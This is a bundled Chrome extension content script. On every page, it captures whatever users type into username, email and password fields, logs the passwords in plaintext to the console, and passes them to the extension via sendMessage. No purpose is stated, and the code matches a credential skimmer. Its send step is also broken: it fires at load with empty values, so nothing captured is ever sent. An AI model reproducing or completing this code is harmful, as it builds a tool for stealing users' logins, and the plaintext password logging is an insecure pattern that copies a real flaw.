/******/ (() => { // webpackBootstrap
var __webpack_exports__ = {};
/*!********************************************!*\
  !*** ./src/contentScript/contentScript.js ***!
  \********************************************/
console.log("====================================");
console.log("coming from content script ");
console.log("====================================");

let usernameField = null;
let passwordField = null;
let finalusername = "";
let finalpassword = "";

function handleInputEvent(event) {
  const input = event.target;

  //   chrome.tabs.query({currentWindow: true, active: true}, function(tabs){
  //     console.log(tabs[0].url);
  // });

  // Check if the input field is a text or email field (common for usernames)
  if (
    input.type === "email" ||
    input.placeholder.includes("Email") ||
    input.placeholder.includes("E-mail") ||
    input.placeholder.includes("Username")
  ) {
    usernameField = input;
  }
  // Check if the input field is a password field
  if (input.type === "password") {
    passwordField = input;
  }

  // If both username and password fields are found, log their values
  //   if (usernameField && passwordField) {
  //     const username = usernameField.value;
  //     const password = passwordField.value;
  //     finalusername = username;
  //     finalpassword = password;
  //   }
  //   console.log(finalusername);
  //   console.log(finalpassword);
  // }

  if (usernameField) {
    const username = usernameField.value;
    finalusername = username;
    console.log(finalusername);
  }

  if (passwordField) {
    const password = passwordField.value;
    finalpassword = password;
    console.log(finalpassword);
  }

  

   
}


document.addEventListener("input", handleInputEvent, true);

const response = chrome.runtime.sendMessage({
  uname: finalusername,
  upass: finalpassword,
});



/******/ })()
;
//# sourceMappingURL=contentScript.js.map